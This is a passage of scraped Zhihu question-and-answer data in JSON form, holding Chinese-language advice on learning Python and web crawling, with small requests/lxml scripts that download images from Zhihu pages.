data-original=\"https://pic4.zhimg.com/cb1988827eb53002ebb9d3ac9864d197_r.jpg\"&gt;第二（第一的姊妹篇）：Python爬虫入门教程（来源于博主：blog.csdn.net/column/details/why-bug.html）Python版本：2.7教程目录：[Python]网络爬虫（一）：抓取网页的含义和URL基本构成[Python]网络爬虫（二）：利用urllib2通过指定的URL抓取网页内容[Python]网络爬虫（三）：异常的处理和HTTP状态码的分类[Python]网络爬虫（四）：Opener与Handler的介绍和实例应用[Python]网络爬虫（五）：urllib2的使用细节与抓站技巧[Python]网络爬虫（六）：一个简单的百度贴吧的小爬虫[Python]网络爬虫（七）：Python中的正则表达式教程[Python]网络爬虫（八）：糗事百科的网络爬虫（v0.3）源码及解析(简化更新)[Python]网络爬虫（九）：百度贴吧的网络爬虫（v0.4）源码及解析[Python]网络爬虫（十）：一个爬虫的诞生全过程（以山东大学绩点运算为例）[Python]网络爬虫（11）：亮剑！爬虫框架小抓抓Scrapy闪亮登场！[Python]网络爬虫（12）：爬虫框架Scrapy的第一个爬虫示例入门教程&lt;img src=\"https://pic4.zhimg.com/b0a1d270b45c17dd8c3e857d76bc0c47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"80\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic4.zhimg.com/b0a1d270b45c17dd8c3e857d76bc0c47_r.jpg\"&gt;第三：你已经看完上面（第一或者第二）的教程：再推荐知乎用户@陈唯源 的实战练习博客 Python爬虫学习记录（1）——Xiami全站播放数Python爬虫学习记录（2）——LDA处理歌词百度音乐带标签，作曲，演唱者，类别的歌词数据Python爬虫学习记录（4）——传说中的足彩倍投法。。好像也不是那么靠谱2011~2013.5全球所有足球比赛比分数据以及足彩各公司盘口Python爬虫学习记录（3）——用Python获取虾米加心歌曲，并获取MP3下载地址Python爬虫学习记录（5）——python mongodb + 爬虫 + web.py 的acfun视频排行榜 Python爬虫学习记录（0）——Python 爬虫抓站 记录（虾米，百度，豆瓣，新浪微博）第四：最后推荐知乎用户@gaga salamer 的实战练习博客爬虫教程（1）基础入门爬虫教程（2）性能进阶 知乎用户信息爬虫（规模化爬取）用scrapy爬取豆瓣电影新片榜用scrapy对豆瓣top250页面爬取（多页面爬取）用scrapy自动爬取下载图片用scrapy自动下载石原sama的豆瓣影人图集(727张图片，自动下载） 希望以上的教程可以帮助到大家。&lt;img src=\"https://pic3.zhimg.com/a0b4e54b0987ae6d43a684c13ae7c59b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"80\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic3.zhimg.com/a0b4e54b0987ae6d43a684c13ae7c59b_r.jpg\"&gt;如果你想学习编程，但是找不到学习路径和资源，欢迎关注专栏：学习编程 如何一步一步的学Java - 知乎专栏C、C++语言学习资料 - 知乎专栏学好Python的11个优秀资源 - 知乎专栏程序员把妹指南之修电脑篇  - 知乎专栏编程教程资源整理汇总- 知乎专栏免费实用的API接口 - 知乎专栏零基础如何开发游戏 - 知乎专栏代码编辑器的配色方案 - 知乎专栏", "comments_num": 603, "zhuanlan_object_id": "82993209c0a9cb6a83605a661d7b604a"},{"question_title": "零基础应该选择学习 java、php、前端 还是 python？", "question_url": "https://www.zhihu.com/question/40801731", "question_id": 40801731, "answer_num": 300, "followers": 7022, "visitors": 1725548, "topics": "Python,编程,生活方式,Java,大学生学习", "question_object_id": "13657ed33ba66da852fcc66405bc20be", "answer_id_list": "91814769,88336537,506876247,203894909,95287246", "answer_url_list": "https://www.zhihu.com/question/40801731/answer/91814769,https://www.zhihu.com/question/40801731/answer/88336537,https://www.zhihu.com/question/40801731/answer/506876247,https://www.zhihu.com/question/40801731/answer/203894909,https://www.zhihu.com/question/40801731/answer/95287246"},{"answer_url": "https://www.zhihu.com/question/20899988/answer/165536870", "answer_id": 165536870, "comments_num": 99, "answer_article": "如果学会了python的基本语法，我认为入门爬虫是很容易的。我写的第一个爬虫大概只需要10分钟，自学的 scrapyd ,  看官方文档花了20分钟，因为我英文不是很好，很多单词需要搜索一下。官方文档链接 https://docs.scrapy.org/en/latest/intro/tutorial.html ）(scrapy 并不是入门必须的，所以你可以看完我的答案再酌情考虑 scrapy ）再接触到了 requests , lxml ，配合基本库 urllib, urllib2 就几乎无所不能了。后来有人推荐我用 BeatufulSoup  之类的库，但其实原理都差不多。一、入门爬虫的干货 0. 爬虫的基本思路 a. 通过URL或者文件获取网页，b. 分析要爬取的目标内容所在的位置c. 用元素选择器快速提取(Raw) 目标内容d. 处理提取出来的目标内容 （ 通常整理合成一个 Json） e. 存储处理好的目标内容 （比如放到 MongoDB 之类的数据库，或者写进文件里。） 1. 为什么我入门爬虫那么快，我是不是在装逼？ 答：我自己总结了一下，在接触爬虫之前：       a. 我挺了解HTTP 协议（看了《HTTP权威指南》），b. 我写过基于Flask框架的后端（大概三年前@萧井陌 在知乎上推荐Flask框架，然后我就自学了，用的是《Flask Web开发：基于Python的Web应用开发实战 》） c. 我写过前端(HTML+CSS+JS)，了解什么是DOM ，会一点jquery。 d. 正则也是勉强够用的。 e. 本人大学也是计算机专业，学习挺认真的。 f. 所以算是厚积薄发。 2. 那么毫无专业基础，也没有前后端基础的人应该怎么办？ 答：那当然要超过半小时啦。先花点时间去大概了解以下内容： a. HTTP协议的请求方法，请求头部，请求数据b. 大概了解一下什么是 cookie c. 学一点HTML和元素选择器 d. 学会使用Chrome 的 开发者工具      磨刀不误砍柴工，当然如果有人带着，这些大概1-2小时就能过到能凑合用的程度了。如果没人带，就上网搜索学习一下，也很快的，估摸最多十小时。 ps, 阮一峰老师的技术入门博客写得很不错，除此之外，博客园也有很多好资源。3. 放一个新鲜出炉的代码，看懂就能入门了：&lt;img src=\"https://pic2.zhimg.com/v2-328de6b8952816a1191316eb68a1f6fd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"742\" class=\"origin_image zh-lightbox-thumb\" width=\"864\" data-original=\"https://pic2.zhimg.com/v2-328de6b8952816a1191316eb68a1f6fd_r.jpg\"&gt;4. Python 爬虫常用的库是哪些？入门应该掌握哪些库？答：网上有很多相关的资料，但是我个人觉得新入门的人，不需要也不应该一下子接触所有的库。正如幼儿刚开始学说话的时候，不应该同时教普通话粤语闽南语英语。 我个人认为，学会 requests 和 lxml ，就可以入门爬虫了。      其他的常用库，自己搜，但注意贪多嚼不烂。 （我整理出来的被小马甲人喷了，我很不开心，所以我自己存好删了）二、一点点涉及爬虫进阶的分界线 0. 知乎上很多爬虫代码，一个函数几十行，是很不好的。应该尽量减少重复代码。 1. 重要的事情说三次，函数不是越长越好， 好代码应该简单易懂好维护！函数不是越长越好， 好代码应该简单易懂好维护！ 函数不是越长越好， 好代码应该简单易懂好维护！ (放在进阶是因为能做到这一点的爬虫代码不多，很多都一团乱麻，坑死接盘侠)2. Scrapy + MongoDB + Redis  分布式爬虫系统其实不复杂。a）. Redis 用来存储要爬取的网页队列，也就是任务队列 b）. MongoDB  用来存储爬取的内容结果。c) . Scrapy  里放爬虫crawler , 分别爬取不同的网页内容，ps：分布式这个东西，听起来很恐怖，但是拆开了也就这样。所以不用害怕。*************************-----  讲事故的分割线  ----- ************************* 曾经在某创业公司被赶鸭子上架（我最初是一个后端程序员，现在成分有点复杂，一言难尽），要在一星期内跟一个分布式爬取各大网商（包括淘宝天猫京东等十几家网商，Scrapy + MongoDB + Redis）的数据。当时差点吓坏我了，因为没写过爬虫。  然后leader 给我的线索只有 基本框架是 Scrapy。 也许是无知者无畏， 也没想到去问谁，就自己看了 Scrapy 的文档，半小时就写出来了。后来就很顺利把分布式爬虫系统搭起来了。还爬了谷歌、百度、Bing、 Pinterest 、Instagram 等大量和当时公司业务相关的数据。 就这样，我做到了。当然，加了不少班。ps:  用很多的机器，代表需要爬取的爬取的数据量很多，但是和项目的复杂程度不一定相关。所以不要害怕。害怕也没用，需求来了，一边颤抖一边加班也要写完代码的。pps: 你们要复制粘贴就能跑的代码# -*- coding: utf-8 -*-\nimport os\nimport requests\nfrom lxml import html\n\nheaders = {\n    'Host': 'www.zhihu.com',\n    'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',\n    # 2017.12 经网友提醒，知乎更新后启用了网页压缩，所以不能再采用该压缩头部\n    # !!!注意, 请求头部里使用gzip, 响应的网页内容不一定被压缩，这得看目标网站是否压缩网页\n    # 'Accept-Encoding': 'gzip, deflate, sdch, br',\n    'Connection': 'keep-alive',\n    'Pragma': 'no-cache',\n    'Cache-Control': 'no-cache',\n    'Upgrade-Insecure-Requests': '1',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) '\n                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',\n}\n\n\ndef save(text, filename='temp', path='download'):\n    fpath = os.path.join(path, filename)\n    with open(fpath, 'w') as  f:\n        print('output:', fpath)\n        f.write(text)\n\n\ndef save_image(image_url):\n    resp = requests.get(image_url)\n    page = resp.content\n    filename = image_url.split('zhimg.com/')[-1]\n    save(page, filename)\n\n\ndef crawl(url):\n    resp = requests.get(url, headers=headers)\n    page = resp.content\n    root = html.fromstring(page)\n    image_urls = root.xpath('//img[@data-original]/@data-original')\n    for image_url in image_urls:\n        save_image(image_url)\n\n\nif __name__ == '__main__':\n    # 注意在运行之前，先确保该文件的同路径下存在一个download的文件夹, 用于存放爬虫下载的图片\n    url = 'https://www.zhihu.com/question/27364360'  # 有一双美腿是一种怎样的体验?\n    crawl(url)\n", "praise_num": 853, "answer_object_id": "4f121d9ed2155aee5d740f480a945ff2"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/141170242", "answer_id": 141170242, "comments_num": 159, "answer_article": "我是真正零基础开始学Python的，从一开始的一窍不通，到3个月后成功搭建了一个动态网站（没有用任何框架）。相比于计算机大牛，我更加知道一个小白将会遇到什么坑，遇到哪些难点。我把我的学习过程写在下面，并附上在每个阶段的学习资料，希望对零基础的Python学习者有所帮助。注：本文只做经历分享，不是技术探讨。---在知乎上常常看到想要转行IT，或者是想学习编程但不知如何开始的朋友。回答这类问题的人往往只是列出书单资源然后给出一个大致的方向。有些朋友一开始就扎入了理论学习的汪洋大海，从苦读类似《算法导论》开始，能够坚持读下来的寥寥无几，学习的积极性也被不断的挫败感消磨的所剩无几。一直以来，编程对我而言是一种「黑魔法」般的存在。今年阿里月饼门，当很多人都参与到是非之争的时候，我更加着迷于程序员区区几行代码的脚本所展现出的威力，对于外行而言，这是超乎他们想象之外的某种能力——为什么我守在电脑面前盯着秒针然后拼命点击鼠标都不一定能抢到的礼物，程序员只需要提前花5分钟写3行代码就轻松搞定？所以，我的心底深处一直都想变成这样的一位魔法师。今年的8月，刚好工作上想要开发一个基于微信的英语学习网站，借此机会，我决定好好学习一下编程。在此之前，我所有关于程序的知识仅仅来源于两部分，一是本科时期的C语言必修课，现在已经忘的一干二净，不过好歹我从中明白编程是怎么回事；第二部分是大概两年前由于工作关系学的一些Python，不过只是皮毛，现在忘的七七八八。简单说，我的目标是建立一个网站，不过这个网站是动态的，也就是说它能识别谁登陆，然后对不同的人显示不同的内容。而当时的现实是，我完全不明白网页是如何显示出来的？譬如每个人登陆知乎的时候看到的是定制化的页面，后台是如何基于每个ID来组织出不同的页面的？所有我们看到的问题，回答，参与的评论在背后的服务器上是以一种什么样的形式存在的？又比如为什么有些页面只能在微信端打开，在电脑上就会出错？（不知道你有没有发现这一点）当时我的心中充满了无数个类似的问号？当然如果你也是小白，一定有着同样的疑问。好处是一开始就明确了学习的目的：Web建站。所以我的学习方案基本就是通过做项目学习，哪里不懂就解决哪里，边做边学习，不断推进。另外，由于知道很多成功的网站在用Python做服务器开发，比如知乎，所以我就自然选择了Python。于是我就开始了我充满着挫败感和成就感的编程之路……从8月到12月的四个月里，除去本来的工作，为了学习质量，我会保证平均每天4个小时的学习时间，周末也不例外。另外，所有的文档，问答都尽量看英文的，这可以帮你剩下大量的时间。12月13日，我做的网站上线了，3天时间大概有5000人访问了这个网站，我有时在后台看着日志，不免有些心潮喷涌，我想把自己的经验写下来，希望对于那些有心学习编程但无从下手的朋友提供一些帮助和鼓励。1. 我的自学编程之路1）基础刚开始的时候，我对搭建网站一无所知。为了给自己迅速建立一个框架，我在Google上面泡了整整一天，了解了HTML，CSS，JavaScript，Ajax，jQuery，React，SQL，服务器脚本等等知识，不求精通，只是了解每一项技术是干嘛的，另一方面建立起了一个学习的roadmap，这样大概知道做一个Web App需要哪些知识，分别学习的主次顺序。重点推荐两个资源：Python基础知识：Learn Python the Hard WayWeb App基础知识：@张秋怡的答案写的通俗易懂，极力推荐。有了这个roadmap，我明白了前端三大必须掌握技能HTML，CSS和JavaScript，花了大概10天左右把W3Schools上的教程全部过了一遍，然后试着写了几个网页，感觉自己写的很没有底气。于是根据知乎和豆瓣上的推荐，买了《JaveScript DOM》和《Head First HTML与CSS》，边看书边把例子过了一遍。W3Schools: www.w3schools.com/JavaScript：JavaScript DOM编程艺术HTML &amp; CSS : Head First HTML与CSS（第2版）前端是需要慢慢学习的，在看完上面的资料后，虽然能写出来一些挺漂亮的页面，但是我自己知道很多都是不符合标准的，更不要说代码风格什么的。这只能通过不断地积累和增加代码量来提高。由于明白服务器端需要耗费自己大量的时间，所以在发现自己能够按照构思勉强实现网页之后，我就把学习中心放到了服务器端上。不过每天还是会抽空写一写网页，避免手生。2）服务器端最先了解的是HTTP协议，也就是浏览器和服务器之间是如何通信的。也就是当你在浏览器里键入网址按下回车直到网页显示在你浏览器的这个过程中，浏览器和浏览器之间发生了什么事情。这是很有意思的内容，我是以读小说的心情了解了这部分内容。了解这部分后，你就会明白类似为什么有时候会有404页面？在百度搜索框里键入的搜索词是如何提交到百度服务器的？为什么重新登录知乎的时候就不用再输入密码了？之类的问题了。HTTP协议学习资料：In Introduction to HTTP Basics@Vamei的博客：协议森林了解了HTTP协议之后，我就多少有些入迷了。看似神秘难懂的现象其实原理并不复杂，你反而会被吸引。接下来就进入到我投入时间最多的部分了——后端开发。记得当时了解Web开发的MVC（Model-View-Controller）模式后，有一种心血喷涌的感觉，觉得太有意思了（程序员别喷，我就是这么没见过世面）。我们以知乎为例子来说明MVC是个啥：&lt;img src=\"https://pic3.zhimg.com/v2-0f9a54678b79094188b7e281cc7ffd5e_b.png\" data-rawwidth=\"1029\" data-rawheight=\"623\" class=\"origin_image zh-lightbox-thumb\" width=\"1029\" data-original=\"https://pic3.zhimg.com/v2-0f9a54678b79094188b7e281cc7ffd5e_r.jpg\"&gt;每个人的主页都是相同的布局和风格，例如最上面的菜单搜索栏，颜色分割，左边显示动态等，右边是个人信息等，然后具体的内容却因人而异——每个人的头像，名字，动态都是不一样的。那么知乎是如何保证每一个人看到的都是自己的主页呢？你可以把这个相同的布局想象成一个模板，里面有一个个空格子，当你用你的账户登陆页面时，想象你的电脑里有无数个小人根据你的账号从知乎后台的数据库里取出你的头像，动态，认证信息等等内容，然后对应着模板上规定好的位置，把对应的内容填进去。这些小人的动作实在是太快了，以至于你觉得这是在瞬间完成的。上面所说的模板就是MVC中的V，是View的缩写，负责显示。这样做的好处在于，如果知乎有一天突然想改变一下个人主页的风格，那么只需要改变这一个模板，然后几千万注册用户的主页就相应的变化了，因为模板是公用的，是不是省了很多事情？（早期的Web开发可不是这样哟，你可能要一个个用户去改，非常麻烦。）而这些小人除了摆放内容，它们真正负责的是业务逻辑，我们把他们叫做Controller，也就是MVC中的C。例如当你登陆的时候，这些小人要检查你的用户名是不是准确的，如果准确，它们要去数据库里取出你请求的信息等，如果用户名错误，它们要拦截住你的登陆。它们的职责还有很多，无法一一列举。在实际中，这些小人做的事情其实就是Python（或者其它脚本语言）做的事情。最后，MVC中的Model其实就是传给View的数据，包括上面的头像，用户名，动态等因人而异的数据。这些数据在知乎服务器上是以数据库表格（table）的形式存在的，你可以把它们想象成很多不同的excel表格，不同的表格储存着不同的信息，有些记录着知乎用户的个人信息，有些记录着回答，有些记录着评论等等，而这些表格之间又彼此联系，当你在知乎的不同网页间跳转的时候，上面说的那些小人就根据你的要求，组合对应的表格取出对应的数据，然后把他们放到模板对应的空格里，发送给浏览器。然后浏览器根据你写的CSS，用不同的颜色，大小等等，将数据很漂亮的显示出来。这样做的好处是什么呢？虽然你最终在浏览器里看到的是一个完整的页面，但是在后端逻辑上它们都是区分开的——模型（M），视图（V）和控制器（C）的区分就保证了较高的可维护性——我可以随时修改主页的显示并看到效果，同样我可以随时加入一些业务逻辑。如果你的学习坚持到这里了，首先要恭喜你。其次你可能已经知道一些非常成熟的Python Web框架了，例如Django，Flask等等，并且你可能看到了很多小白教程教你直接使用，毕竟大部分人可能觉得没有必要重复造轮子。本来为了省事，我也打算直接用框架。我是在设计数据库的时候，当时在看SQLAlchemy文档，觉得相对自己的项目SQLAlchemy太过复杂，所以我决定自己写自己的ORM（名词不懂没关系），这对于当时的我来说是一件难度非常大的事情。于是我投入了极大的精力每天都在看关于SQL和Python相关的教程和资料，Python核心编程（第二版） 给了我很大的启发。在自己完成了ORM后，又写了URL处理函数，同样没有用任何现成的Web框架。现在回头看，我认为这一段时间的造轮子是提升编程能力最快的时候。比如为了写ORM，就必须去花很多时间学习SQL，去了解Python里面的metaclass，而如果用一个现成的框架，我很有可能偷懒不去关注某些细节。而不出问题还好，一旦出问题，我就只能跪。另外，造轮子迫使我在开始的时候就构思整个框架，因为我必须尽可能的考虑到所有的情况，于是就会不断的强迫自己完善知识体系，和别人的代码作对比从而改进自己的，这个过程充满了无尽的挫败感，但是得来的成就和快乐也是无可比拟的。SQL书籍：Sams Teach Yourself MySQL in 21 DaysPython：Python核心编程（第二版）Github上的优质Python资源：CodementorIO/Python-Learning-Resources过程中还牵涉到部署，我的网站是跑在Linux上的。关于部署网上有非常多的优质教程，一搜一大把。这里就不再赘述。这些是我学习大致路线，当然过程中充满着小的磕磕绊绊，虽然网站上线了，貌似运行还比较顺利，但是如果以一个程序员的标准来要求自己，自己依然非常菜鸟。不过我并没有以前那样惧怕技术了，就像你明白魔术的背后的原理后，会更多的思考原理本身。2. 自学编程需要注意的问题很多人都推荐小白第一门语言选Python，因为语法简单。这句话只说了一半，Python确实容易上手，对初学者的门槛很低。但我发现，对于小白真正的门槛在于系统知识，这就和用什么语言完全没有任何关系了。例如很多人学完了Python的语法，觉得确实简单，但是转头去用Python标准库的时候，却发现自己连文档都看不懂。标准库提供了Python和其它系统功能的接口，最终实现了Python和系统之间的互动。读标准库需要系统知识，比如操作系统，数据库，进程和线程，socket编程，网络协议等等，这些对于编程小白来才构成很高的门槛，但是只有学会这些，才能真正发挥出Python的威力来。这也是我觉得自己的经历对小白是有价值的一个原因。因为设计一个动态的网页是一个很不错的练手Project。建立网页（Web App）会逼迫你了解从你在浏览器里键入地址按下回车到网页显示在浏览器的过程中，浏览器，网络，服务器都干了些什么。具体到技术上面，你不得不去学习前端的HTML，CSS和JavaScript，后端的脚本，数据库，操作系统等。也就是说，这个过程能够促使你去主动学习上面提到的系统知识，如果你再做另外一个项目，你就不会像现在这样无从下手，而有能力去进行一些技术性的探讨，所以我认为这是一个非常好的练手项目。1）一定要空出时间补充理论知识很多人会强调learn by doing，边做项目边学习，这也是我自己采用的方式。在这种方式中，你不断犯错，改正……学习效率非常高。但是，很多人走了极端，最后的结果就是不注意理论知识的学习。你会发现自己Google的能力越来越高，但是真实的编程能力并没有得到提升。如果有这种情况，你需要反思一下。一种可能是你太过于依赖各种成熟的框架，结果编程就变成了用「胶水」去粘合不同的框架完成需求。就好比你的Web App用了SQLAlchemy，虽然自己不太懂SQL，但是网站跑的也还不错。这时候如果数据库出现了问题，那你就只能跪了。另外一种可能是你完全沉浸在做项目中，忽略了学习理论知识。做项目虽然充满困难，但回报是强烈的成就感，很容易沉浸其中。我觉得这是极其错误的。首先半路出家的程序员都没有经过系统的学习，没有形成自己的知识体系，如果你不懂数据结构，算法复杂度，操作系统这些理论，那么你能达到的高度就极其有限。所以，在每天做项目的同时，一定要保证抽出一定的时间，恶补理论知识。这部分的书单在豆瓣和知乎上都有很多总结，可以自行搜索。2）不要太纠结于无意义的问题，比如什么框架好，XX语言比XX语言好啦这种问题。前期确定了练手项目，就去专心积累代码量，积累基础知识。那些你现在还看不懂的炫酷技术你慢慢也就能明白是怎么回事了，反而没有基础，再炫酷的框架对你而言都是天书。3）学会发问。好问题是建立在你自己已经实践或者思考的基础上问出来的，这是对自己的负责，也是对别人的尊重。不要一遇到困难就喜欢直接上网搜索：「这个问题是怎么回事啊？」，「我不明白你能不能帮我看看……」。4）学好英语。THE END最后，给自己打个广告，如果学英语，一定要关注我。http://weixin.qq.com/r/ETt0bGzEkzHsrSgP924D (二维码自动识别)", "praise_num": 3735, "answer_object_id": "225878233ccee442466c8d4585335920"},{"question_title": "让一台电脑死机至少需要几行代码？", "question_url": "https://www.zhihu.com/question/284886698", "question_id": 284886698, "answer_num": 248, "followers": 4748, "visitors": 3124869, "topics": "操作系统,Python,信息技术（IT）,代码", "question_object_id": "2fb2c1aa725e5342caf932d07c1e402a", "answer_id_list": "443386741,444476682,444793817,443395634,443456531,444579123,443423658,465238782,444846474,444738395", "answer_url_list": "https://www.zhihu.com/question/284886698/answer/443386741,https://www.zhihu.com/question/284886698/answer/444476682,https://www.zhihu.com/question/284886698/answer/444793817,https://www.zhihu.com/question/284886698/answer/443395634,https://www.zhihu.com/question/284886698/answer/443456531,https://www.zhihu.com/question/284886698/answer/444579123,https://www.zhihu.com/question/284886698/answer/443423658,https://www.zhihu.com/question/284886698/answer/465238782,https://www.zhihu.com/question/284886698/answer/444846474,https://www.zhihu.com/question/284886698/answer/444738395"},{"question_title": "Python 的练手项目有哪些值得推荐？", "question_url": "https://www.zhihu.com/question/29372574", "question_descr": "想用python重写一遍，不料我身边已经有同学捷足先登了，提前实现了，这即使我做完之后都不好意思在他面前装逼了，不知道各位还有没有发现别的不错的python项目，最好是综合性的，不要是网站，谢了，题主是一个计算机相关专业大三学生，有一定编程基础。", "question_id": 29372574, "answer_num": 97, "followers": 54682, "visitors": 2132248, "topics": "Python,编程,Python 入门", "question_object_id": "c181168a3221d8ce15f2a08eb37acf39", "answer_id_list": "88624507,88744491,192385626,346927368,44394791", "answer_url_list": "https://www.zhihu.com/question/29372574/answer/88624507,https://www.zhihu.com/question/29372574/answer/88744491,https://www.zhihu.com/question/29372574/answer/192385626,https://www.zhihu.com/question/29372574/answer/346927368,https://www.zhihu.com/question/29372574/answer/44394791"},{"answer_url": "https://www.zhihu.com/question/20899988/answer/96904827", "answer_id": 96904827, "comments_num": 174, "answer_article": "以下是我学python爬虫的打怪升级之路，过程充满艰辛，也充满欢乐，虽然还未打倒大boss，但一路的风景就是最大的乐趣，不是么？希望大家能get到想要的东西！多图预警！&lt;img data-rawheight=\"179\" src=\"https://pic4.zhimg.com/55e8bc9324234bc88b354821ce005bc3_b.jpg\" data-rawwidth=\"288\" class=\"content_image\" width=\"288\"&gt;&lt;img data-rawheight=\"268\" src=\"https://pic3.zhimg.com/af1baba1052c2cd49cea5ea6986eb30a_b.jpg\" data-rawwidth=\"242\" class=\"content_image\" width=\"242\"&gt;&lt;img data-rawheight=\"230\" src=\"https://pic2.zhimg.com/5ec82828ba71e96a7d86b7e88254ccd9_b.jpg\" data-rawwidth=\"254\" class=\"content_image\" width=\"254\"&gt;&lt;img data-rawheight=\"320\" src=\"https://pic3.zhimg.com/c60bde3fec9e5f791b1a217613879b46_b.jpg\" data-rawwidth=\"278\" class=\"content_image\" width=\"278\"&gt;&lt;img data-rawheight=\"318\" src=\"https://pic3.zhimg.com/974b3d7c1c50bac62c14afe58ff0ed26_b.jpg\" data-rawwidth=\"309\" class=\"content_image\" width=\"309\"&gt;&lt;img data-rawheight=\"264\" src=\"https://pic2.zhimg.com/2c3e1e5f18d6e6cc8758337663c548f5_b.jpg\" data-rawwidth=\"313\" class=\"content_image\" width=\"313\"&gt;&lt;img data-rawheight=\"240\" src=\"https://pic4.zhimg.com/b65ad1e407e0335107eca80e4a0bdac3_b.jpg\" data-rawwidth=\"266\" class=\"content_image\" width=\"266\"&gt;&lt;img data-rawheight=\"246\" src=\"https://pic2.zhimg.com/70067cc590378e31676ed48192633d7d_b.jpg\" data-rawwidth=\"269\" class=\"content_image\" width=\"269\"&gt;&lt;img data-rawheight=\"254\" src=\"https://pic4.zhimg.com/2cecf7ef8b19f24a2fb287403a51142b_b.jpg\" data-rawwidth=\"299\" class=\"content_image\" width=\"299\"&gt;&lt;img data-rawheight=\"266\" src=\"https://pic3.zhimg.com/b2867a2ddb861a04a91fde5d34ed5982_b.jpg\" data-rawwidth=\"212\" class=\"content_image\" width=\"212\"&gt;&lt;img data-rawheight=\"266\" src=\"https://pic3.zhimg.com/ae5a6594ab77bfdeaaa9e45b9420c93e_b.jpg\" data-rawwidth=\"313\" class=\"content_image\" width=\"313\"&gt;&lt;img data-rawheight=\"232\" src=\"https://pic4.zhimg.com/5f65be4b49e5f84ab99efc92ab6ea61b_b.jpg\" data-rawwidth=\"304\" class=\"content_image\" width=\"304\"&gt;&lt;img data-rawheight=\"234\" src=\"https://pic2.zhimg.com/506899fbbe618e05cbe1e2768665b17d_b.jpg\" data-rawwidth=\"287\" class=\"content_image\" width=\"287\"&gt;&lt;img data-rawheight=\"354\" src=\"https://pic1.zhimg.com/009fcaa5d4a08f4eda54fb38b88e575c_b.jpg\" data-rawwidth=\"325\" class=\"content_image\" width=\"325\"&gt;&lt;img data-rawheight=\"243\" src=\"https://pic3.zhimg.com/b93fbe0719c946b1a68a3f0b33937942_b.jpg\" data-rawwidth=\"289\" class=\"content_image\" width=\"289\"&gt;&lt;img data-rawheight=\"189\" src=\"https://pic2.zhimg.com/ded59bb8038a10b3bfb4e65fd14db631_b.jpg\" data-rawwidth=\"309\" class=\"content_image\" width=\"309\"&gt;&lt;img data-rawheight=\"346\" src=\"https://pic2.zhimg.com/8d8337c43a58a5386227e037891f9d61_b.jpg\" data-rawwidth=\"266\" class=\"content_image\" width=\"266\"&gt;&lt;img data-rawheight=\"269\" src=\"https://pic2.zhimg.com/e5dbb6f838f6532b0d0a481c69a79ddd_b.jpg\" data-rawwidth=\"338\" class=\"content_image\" width=\"338\"&gt;&lt;img data-rawheight=\"175\" src=\"https://pic4.zhimg.com/5e1b525feb212ff0b860481ecb67288b_b.jpg\" data-rawwidth=\"255\" class=\"content_image\" width=\"255\"&gt;以下奉献一段爬取知乎头像的代码import requestsimport urllibimport reimport randomfrom time import sleepdef main():    url='知乎 - 与世界分享你的知识、经验和见解'    #感觉这个话题下面美女多    headers={省略}    i=1    for x in xrange(20,3600,20):        data={'start':'0','offset':str(x),'_xsrf':'a128464ef225a69348cef94c38f4e428'}        #知乎用offset控制加载的个数，每次响应加载20        content=requests.post(url,headers=headers,data=data,timeout=10).text        #用post提交form data        imgs=re.findall('&lt;img src=\\\\\\\\\\\"(.*?)_m.jpg',content)          #在爬下来的json上用正则提取图片地址，去掉_m为大图          for img in imgs:            try:                img=img.replace('\\\\','')                #去掉\\字符这个干扰成分                pic=img+'.jpg'                path='d:\\\\bs4\\\\zhihu\\\\jpg\\\\'+str(i)+'.jpg'                #声明存储地址及图片名称                urllib.urlretrieve(pic,path)                #下载图片                print u'下载了第'+str(i)+u'张图片'                i+=1                sleep(random.uniform(0.5,1))                #睡眠函数用于防止爬取过快被封IP            except:                print u'抓漏1张'                pass        sleep(random.uniform(0.5,1))if __name__=='__main__':    main() 结果：&lt;img data-rawheight=\"744\" src=\"https://pic2.zhimg.com/b1fc67ee3e290376fe882113ff7d44fd_b.jpg\" data-rawwidth=\"710\" class=\"origin_image zh-lightbox-thumb\" width=\"710\" data-original=\"https://pic2.zhimg.com/b1fc67ee3e290376fe882113ff7d44fd_r.jpg\"&gt;最后，请关注我吧，我会好好维护你的时间线的  ＼( ^▽^ )／ 公众号已开通：挖数（ID:washu66），推送各种数据相关的原创文章哦", "praise_num": 5309, "answer_object_id": "9c0ad8e0e184b6302be0d1b608ed74e3"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/394020225", "answer_id": 394020225, "comments_num": 32, "answer_article": "1.第一 python入门基础：这些都是基础，基本概念必须清楚！学习Python需要掌握如下基础知识以及相关技能。1.Python基础知识（变量、语句、数据类型、数值类型、字符串、布尔类型、列表、字典、元组、条件语句、循环语句、函数、装饰器、面向对象、网络socket、爬虫）2.Python基础库（模块、包、系统模块、三方模块）3.python文件处理（读、写、执行、）4.python字符统计5.python数据排序2.学习方法：万虐终成神！敲代码，解决BUG才是学习，无数次的看视频不是学习，至少不会学好。只记Python基础语法，却没什么鸟用。就像幼儿园，老师在黑板上写的‘肉’字，记住这个字咋写，一笔一划的记住，只需要半天，但是把这个词和你平时吃的东西绑定，以至于后面你想到这个字，就流口水，需要日常的重复训练。同理：无方向的看书，看视频也没什么用，其实可以通过直接实战来上手，比如：文件操作字符排序网络编程错误的学习方法：很多人在学习Python的时候常常会犯下面一种情况：买一本厚厚的编程指南，逼自己看完，记住每个语法，闭门看书三个月，吃透一本书，最后一行代码也写不出来。正确的学习方法：编程就像骑自行车，买一本&lt;&lt;骑自行车大全&gt;&gt;是没有什么用的。正确姿势：掌握最基础的姿势，就可以骑上车出发了，实际联系几天，摔几跤，基本就学会了。3.自我进行测评：基础门槛，不过需要找原因并解决。很多朋友反馈：Python基础语法都学会了，但不知如何写项目进阶？1.List，Dict特性倒背如流，就是无法写出实际的项目。2.各种书籍也看，写不出东西。3.各种视频也看，写不出东西。4.各种大会也去，名词高大上，但是没学到具体的技能。对自我进行检测：1.给你一个字符串“come 